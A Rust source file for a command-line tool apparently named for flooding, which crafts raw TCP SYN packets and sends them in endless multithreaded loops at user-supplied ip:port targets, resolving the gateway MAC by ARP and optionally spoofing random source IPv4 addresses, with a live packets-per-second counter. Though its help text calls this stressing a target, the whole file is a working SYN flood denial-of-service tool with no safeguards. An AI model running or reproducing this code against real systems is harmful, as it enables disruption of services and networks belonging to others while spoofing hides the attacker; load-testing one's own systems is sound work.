extern crate pnet;
extern crate rand;

use crate::rand::Rng;
use clap::Parser;

use default_net::gateway::Gateway;
use default_net::interface::{get_default_interface, get_interfaces};

use indicatif::{HumanBytes, HumanCount};

use pnet::datalink::Channel::Ethernet;
use pnet::datalink::{self, DataLinkReceiver, DataLinkSender, MacAddr};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{self, Ipv4Flags, MutableIpv4Packet};
use pnet::packet::tcp::{self, MutableTcpPacket, TcpFlags, TcpOption};

use rawsock::traits::Library as PacketLibrary;
use rawsock::Error as PacketError;
use rawsock::{open_best_library, DataLink};

use std::error::Error;
use std::io::{stdout, Write};
use std::net::{IpAddr, Ipv4Addr, SocketAddr, SocketAddrV4, ToSocketAddrs};
use std::str::FromStr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

const ETHERNET_HEADER_LEN: usize = 14;
const ETHERNET_ARP_PACKET_LEN: usize = 42;
const IPV4_HEADER_LEN: usize = 20;
const TCP_SYN_PACKET_LEN: usize = 66;

const NO_SPACE_ERR: &str = "send: No buffer space available";

#[derive(Debug, Clone)]
pub struct Config {
    pub iface_name: String,
    pub datalink_type: DataLink,
    pub iface_ip: Ipv4Addr,
    pub gateway_ip: Ipv4Addr,
    pub src_mac: MacAddr,
    pub dest_mac: MacAddr,
    pub enable_spoofing: bool,
}

// XXX: it's actually MacAddr or error (i assume, should be just a Result)
fn find_mac(
    sender: &mut Box<dyn DataLinkSender>,
    receiver: &mut Box<dyn DataLinkReceiver>,
    source_mac: MacAddr,
    source_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
) -> MacAddr {
    let mut buf = [0u8; ETHERNET_ARP_PACKET_LEN];

    // setup Ethernet header
    {
        let mut eth_header = MutableEthernetPacket::new(&mut buf[..ETHERNET_HEADER_LEN]).unwrap();

        eth_header.set_source(source_mac);
        eth_header.set_destination(MacAddr::broadcast());
        eth_header.set_ethertype(EtherTypes::Arp);
    }

    // setup ARP packet
    {
        let mut arp_packet = MutableArpPacket::new(&mut buf[ETHERNET_HEADER_LEN..]).unwrap();

        arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp_packet.set_protocol_type(EtherTypes::Ipv4);
        arp_packet.set_hw_addr_len(6);
        arp_packet.set_proto_addr_len(4);
        arp_packet.set_operation(ArpOperations::Request);
        arp_packet.set_sender_hw_addr(source_mac);
        arp_packet.set_sender_proto_addr(source_ip);
        arp_packet.set_target_hw_addr(MacAddr::zero());
        arp_packet.set_target_proto_addr(target_ip);
    }

    sender.send_to(&buf, None).unwrap().unwrap();

    // XXX: loop thourgh packets with timeout,
    //      and send another ARP packet on the first fire of a timer
    loop {
        match receiver.next() {
            Ok(buf) => {
                if let Some(arp) =
                    ArpPacket::new(&buf[MutableEthernetPacket::minimum_packet_size()..])
                {
                    if arp.get_operation() == ArpOperations::Reply
                        && arp.get_sender_proto_addr() == target_ip
                    {
                        return arp.get_sender_hw_addr();
                    }
                } else {
                    // XXX: argressive solution though might be good as a workaround
                    sender.send_to(&buf, None).unwrap().unwrap();
                }
            }
            Err(e) => panic!("Error happened {}", e),
        }
    }
}

fn rand_ipv4() -> Ipv4Addr {
    let mut rng = rand::thread_rng();
    Ipv4Addr::new(
        rng.gen_range(1..255),
        rng.gen_range(1..255),
        rng.gen_range(1..255),
        rng.gen_range(1..255),
    )
}

// XXX: keep configuration for IP spoofing
fn build_syn_packet(config: &Config, dest: &SocketAddrV4, buf: &mut [u8]) {
    let iface_ip = config.iface_ip;

    // setup Ethernet header
    {
        let mut eth_header = MutableEthernetPacket::new(&mut buf[..ETHERNET_HEADER_LEN]).unwrap();

        eth_header.set_destination(config.dest_mac);
        eth_header.set_source(config.src_mac);
        eth_header.set_ethertype(EtherTypes::Ipv4);
    }

    // setup IP header
    {
        let mut ip_header = MutableIpv4Packet::new(
            &mut buf[ETHERNET_HEADER_LEN..(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)],
        )
        .unwrap();
        ip_header.set_header_length(69);
        ip_header.set_total_length(52);
        ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_header.set_source(iface_ip);
        ip_header.set_destination(*dest.ip());
        ip_header.set_identification(rand::random::<u16>());
        ip_header.set_ttl(64);
        ip_header.set_version(4);
        ip_header.set_flags(Ipv4Flags::DontFragment);

        let checksum = ipv4::checksum(&ip_header.to_immutable());
        ip_header.set_checksum(checksum);
    }

    // setup TCP header
    {
        let mut tcp_header =
            MutableTcpPacket::new(&mut buf[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..]).unwrap();

        tcp_header.set_source(rand::random::<u16>());
        tcp_header.set_destination(dest.port());
        tcp_header.set_flags(TcpFlags::SYN);
        tcp_header.set_window(65535);
        tcp_header.set_data_offset(8);
        tcp_header.set_urgent_ptr(0);
        tcp_header.set_sequence(0);
        tcp_header.set_options(&[
            TcpOption::mss(1460),
            TcpOption::sack_perm(),
            TcpOption::nop(),
            TcpOption::nop(),
            TcpOption::wscale(6),
        ]);

        let checksum = tcp::ipv4_checksum(&tcp_header.to_immutable(), &iface_ip, dest.ip());
        tcp_header.set_checksum(checksum);
    }
}

fn spoof_syn_packet(destination: &SocketAddrV4, buf: &mut [u8]) {
    let source_ip = rand_ipv4();

    // update IP header
    {
        let mut ip_header = MutableIpv4Packet::new(
            &mut buf[ETHERNET_HEADER_LEN..(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)],
        )
        .unwrap();
        ip_header.set_source(source_ip);
        ip_header.set_identification(rand::random::<u16>());

        let checksum = ipv4::checksum(&ip_header.to_immutable());
        ip_header.set_checksum(checksum);
    }

    recycle_syn_packet(&source_ip, destination, buf);
}

fn recycle_syn_packet(iface_ip: &Ipv4Addr, destination: &SocketAddrV4, buf: &mut [u8]) {
    // update TCP header
    {
        let mut tcp_header =
            MutableTcpPacket::new(&mut buf[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..]).unwrap();

        // XXX: it's likely to be much faster to cycle over shuffle vector
        tcp_header.set_source(rand::random::<u16>());
        let checksum = tcp::ipv4_checksum(&tcp_header.to_immutable(), iface_ip, destination.ip());
        tcp_header.set_checksum(checksum);
    }
}

fn stress_ip(
    plib: &Box<dyn PacketLibrary>,
    config: Config,
    destinations: Vec<SocketAddrV4>,
    packets_sent: Arc<AtomicU64>,
) {
    let iface = plib
        .open_interface(&config.iface_name)
        .expect("Could not open network interface");

    let num_dest = destinations.len();
    let mut buffers: Vec<[u8; TCP_SYN_PACKET_LEN]> = Vec::new();
    for ind in 0..num_dest {
        let mut buffer = [0u8; TCP_SYN_PACKET_LEN];
        // building initial packet for each destination
        build_syn_packet(&config, &destinations[ind], &mut buffer);
        buffers.push(buffer);
    }

    loop {
        for cursor in 0..num_dest {
            if config.enable_spoofing {
                // replace port field in the packet, recompute checksum
                spoof_syn_packet(&destinations[cursor], &mut buffers[cursor]);
            } else {
                recycle_syn_packet(
                    &config.iface_ip,
                    &destinations[cursor],
                    &mut buffers[cursor],
                );
            }
            let buf = match config.datalink_type {
                DataLink::Ethernet => &buffers[cursor],
                DataLink::RawIp => &buffers[cursor][ETHERNET_HEADER_LEN..],
                _ => panic!("Unsupported datalink"),
            };
            if let Err(PacketError::SendingPacket(msg)) = iface.send(buf) {
                if NO_SPACE_ERR.ne(&msg) {
                    panic!("Packets sending failed: {}", msg);
                }
            }
            packets_sent.fetch_add(1, Ordering::SeqCst);
        }
    }
}

#[derive(Debug, Clone)]
struct Target(SocketAddrV4);

impl FromStr for Target {
    type Err = Box<dyn Error + Send + Sync + 'static>;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        Ok((match s.to_socket_addrs().unwrap().next().unwrap() {
            SocketAddr::V4(addr) => Some(Self(addr)),
            _ => None,
        })
        .ok_or_else(|| format!("invalid target format {}", s))?)
    }
}

#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    /// ip:port pair to stress out
    #[clap(parse(try_from_str))]
    target: Vec<Target>,

    /// Threads used to send packets  (default=1)
    #[clap(short = 'T', long, parse(try_from_str))]
    sender_threads: Option<u8>,

    /// Source port(s) for packets
    #[clap(short = 's', long, parse(try_from_str))]
    source_port: Option<u16>,

    /// Source address(es) for packets
    #[clap(short = 'S', long)]
    source_ip: Option<Ipv4Addr>,

    /// Specify gateway IP address
    #[clap(short = 'g', long)]
    gateway_ip: Option<Ipv4Addr>,

    /// Specify gateway MAC address
    #[clap(short = 'G', long)]
    gateway_mac: Option<MacAddr>,

    /// Specify network interface to use
    #[clap(short = 'i', long)]
    interface: Option<String>,

    /// Enable random source address (IPv4) spoofing. Disabled by default.
    /// Note that more often than not these packets would be dropped by the network
    #[clap(long)]
    enable_spoofing: bool,
}

// XXX: it should return Result<> instead of panic
fn resolve_iface(plib: &Box<dyn PacketLibrary>, args: &Args) -> Config {
    let iface_name: String = args
        .interface
        .clone()
        .or_else(|| match get_default_interface() {
            Ok(iface) => Some(iface.name),
            _ => panic!("Cannot detect default interface, use -i flag to specify it explicitly"),
        })
        .unwrap();

    let dlink_iface = plib
        .open_interface(&iface_name)
        .expect(&format!("Could not open network interface {}", iface_name));
    let dlink_type = dlink_iface.data_link();

    let dinterface = get_interfaces()
        .into_iter()
        .find(|iface| iface.name == iface_name)
        .unwrap();

    // XXX: no need to search the same thing twice
    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == iface_name)
        .unwrap();

    let iface_ip: Ipv4Addr = args
        .source_ip
        .clone()
        .or_else(|| {
            interface
                .ips
                .iter()
                // XXX: we could make use of multiple IPs BTW
                .filter_map(|network| match network.ip() {
                    IpAddr::V4(ipv4) => Some(ipv4),
                    _ => None,
                })
                .next()
        })
        .expect(&format!(
            "the interface {} does not have any IPv4 addresses",
            iface_name
        ));

    let gateway_ip: Ipv4Addr = args
        .gateway_ip
        .clone()
        .or_else(|| match dlink_type {
            DataLink::RawIp => Some("0.0.0.0".parse().unwrap()),
            _ => None,
        })
        .or_else(|| match dinterface.gateway {
            Some(Gateway { ip_addr, .. }) => {
                if let IpAddr::V4(ip_addr) = ip_addr {
                    Some(ip_addr)
                } else {
                    None
                }
            }
            _ => None,
        })
        .expect("Default gateway cannot be detected");

    let source_mac = interface.mac.unwrap();
    let destination_mac: MacAddr = args
        .gateway_mac
        .clone()
        .or_else(|| match dlink_type {
            DataLink::RawIp => Some("00:00:00:00:00:00".parse().unwrap()),
            _ => None,
        })
        .or_else(|| {
            let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
                Ok(Ethernet(tx, rx)) => (tx, rx),
                Ok(_) => panic!("Unknown channel type"),
                Err(e) => panic!("Error happened {}", e),
            };
            // XXX: only replace dest IP with gateway IP if it's not broadcast
            //      (i assume it should just fail write away on broadcast)
            Some(find_mac(&mut tx, &mut rx, source_mac, iface_ip, gateway_ip))
        })
        .unwrap();

    Config {
        iface_name,
        datalink_type: dlink_type,
        iface_ip,
        gateway_ip,
        src_mac: source_mac,
        dest_mac: destination_mac,
        enable_spoofing: args.enable_spoofing,
    }
}

fn main() {
    let args = Args::parse();

    println!(
        r"
   ____       ________   ____                 __ 
  / __ \_  __/ __/ __/  / __/___ ___  _______/ /_
 / / / / |/_/ /_/ /_   / /_/ __ `/ / / / ___/ __/
/ /_/ />  </ __/ __/  / __/ /_/ / /_/ (__  ) /_  
\____/_/|_/_/ /_/    /_/  \__,_/\__,_/____/\__/  
    "
    );

    let plib = open_best_library().expect("Could not open any packet capturing library");
    println!("Loaded {}", plib.version());
    print!("Preparing config...");
    stdout().flush().unwrap();

    let config = resolve_iface(&plib, &args);

    println!(" DONE");
    println!(
        r"
Source:
  iface {} ({})
  inet {}
  gw {}
  ether {}
  dest {}

Launching packets...",
        config.iface_name,
        config.datalink_type,
        config.iface_ip,
        config.gateway_ip,
        config.src_mac,
        config.dest_mac,
    );
    stdout().flush().unwrap();

    let packets_sent = Arc::new(AtomicU64::new(0));

    let mut handles = Vec::new();
    let num_workers = args.sender_threads.unwrap_or(1);
    let plib = Arc::new(plib);
    let targets: Vec<SocketAddrV4> = args.target.into_iter().map(|addr| addr.0).collect();
    for _ in 0..num_workers {
        let packets_sent = Arc::clone(&packets_sent);
        let plib = Arc::clone(&plib);
        let config = config.clone();
        let targets = targets.clone();
        handles.push(thread::spawn(move || {
            stress_ip(&plib, config, targets, packets_sent);
        }));
    }

    let packets_sent = Arc::clone(&packets_sent);
    let progress_printer = thread::spawn(move || {
        let start = Instant::now();
        loop {
            thread::sleep(Duration::from_secs(1));
            let sent = packets_sent.load(Ordering::Relaxed);
            let elapsed_seconds = start.elapsed().as_secs();
            println!(
                "==> {}s sent: {} ({} pps) traffic: {} ({}/s)",
                elapsed_seconds,
                HumanCount(sent).to_string(),
                HumanCount(sent / elapsed_seconds).to_string(),
                HumanBytes(sent * TCP_SYN_PACKET_LEN as u64).to_string(),
                HumanBytes(sent * TCP_SYN_PACKET_LEN as u64 / elapsed_seconds).to_string()
            );
        }
    });

    // now we can join all threads
    for handle in handles.into_iter() {
        handle.join().unwrap();
    }
    progress_printer.join().unwrap();
}
